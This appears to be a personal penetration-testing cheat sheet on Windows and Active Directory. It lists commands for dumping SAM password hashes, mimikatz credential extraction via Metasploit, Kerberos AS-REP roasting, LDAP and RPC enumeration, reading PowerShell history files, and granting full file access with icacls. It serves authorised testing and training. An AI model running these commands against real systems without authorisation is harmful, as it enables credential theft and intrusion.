### SAM (Security Account Manager)
A file that store Windows user credential. It can only be accessed when the Windows OS is not booted up. (Eg. from another OS) <br />
Passwords are LM & NTLM hashed <br />
```
Default file location: 
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYSTEM

Dumping hashes:
samdump2 SYSTEM SAM
pwdump.py SYSTEM SAM    # For Windows 10

Format of Hashes:
[USERNAME]:[RID]:[LMHash]:[NTLMHash]:::   # RID = Relative Identifier
```

Ref: https://techgenix.com/how-cracked-windows-password-part2/

### Active Directory & LDAP
Enum
```
nmap -n -sV --script "ldap* and not brute" [IP_ADDR]
ldapsearch -h [IP_ADDR] -x -b "dc=[DC],dc=[DC]"
windapsearch.py -d [DOMAIN] --dc-ip [IP_ADDR] -U    # -U to enumerate all AD users; -G for AD group enumerate
```
Ref: https://book.hacktricks.xyz/pentesting/pentesting-ldap

### PowerShell history check
```
C:\Users\[username]\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
```

### Kerberos
```
kerbrute userenum --dc [DOMAIN] -d [DOMAIN] [WORDLIST]    # enum user
GetNPUsers.py [DOMAIN]/[USERNAME] -request -no-pass -dc-ip [IP_ADDR]    # get user that does not require kerberos preauth
```
Ref: https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py

### Metasploit
```
getsystem
load kiwi   # mimikatz
lsa_dump_sam
```

### iCACLS.exe
```
Change file and folder permission 
icacls [FILE] /grant [USERNAME]:F   # :F for full access
```
Ref: https://ss64.com/nt/icacls.html

### RPC Dump
```
rpcdump.py [USERNAME]@[IP_ADDR]
```
